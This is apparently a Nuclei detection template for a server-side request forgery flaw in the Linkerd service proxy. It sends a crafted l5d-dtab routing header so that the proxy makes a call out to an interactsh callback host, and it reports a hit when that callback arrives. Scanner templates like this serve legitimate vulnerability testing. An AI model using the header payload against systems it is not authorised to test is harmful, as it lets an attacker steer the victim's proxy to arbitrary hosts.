http:
- headers:
    l5d-dtab: /svc/* => /$/inet/{{interactsh-url}}/443
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  stop-at-first-match: true
id: linkerd-ssrf-detect
info:
  author: dudez
  metadata:
    max-request: 1
  name: Linkerd SSRF detection
  reference:
  - https://twitter.com/nirvana_msu/status/1084144955034165248
  severity: high
  tags: ssrf
